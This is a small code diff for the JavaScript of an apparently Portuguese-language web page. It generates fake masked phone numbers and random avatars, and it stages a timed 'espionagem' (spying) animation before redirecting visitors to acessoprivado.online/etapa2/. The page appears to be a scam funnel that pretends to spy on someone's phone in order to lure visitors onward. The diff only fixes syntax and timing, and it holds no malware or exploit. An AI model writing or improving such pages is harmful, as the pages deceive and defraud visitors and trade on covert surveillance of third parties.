@@ -417,13 +417,13 @@
     function generateRandomPhone(countryCode) {
       const areaCode = Math.floor(Math.random() * 90) + 10;
       const number = Math.floor(Math.random() * 9000) + 1000;
-      return ${countryCode} ${areaCode} 9${number}-****;
+      return `${countryCode} ${areaCode} 9${number}-****`;
     }
 
     // Obter avatar aleatório
     function getRandomAvatar() {
       const randomId = avatarIds[Math.floor(Math.random() * avatarIds.length)];
-      return https://i.pravatar.cc/40?img=${randomId};
+      return `https://i.pravatar.cc/40?img=${randomId}`;
     }
 
     // Obter status aleatório
@@ -483,11 +483,12 @@
       submitBtn.style.display = 'none';
       loadingElement.style.display = 'flex';
       
-      // Simular processo de "espionagem"
- setTimeout(() => {
-  window.location.href = 'https://acessoprivado.online/etapa2/';
-}, 2000);
-
+      // Simular processo de "espionagem" y redirigir
+      setTimeout(() => {
+        loadingElement.style.display = 'none';
+        submitBtn.style.display = 'block';
+        window.location.href = 'https://acessoprivado.online/etapa2/';
+      }, 3000);
     });
 
     // Validação em tempo real do número de telefone
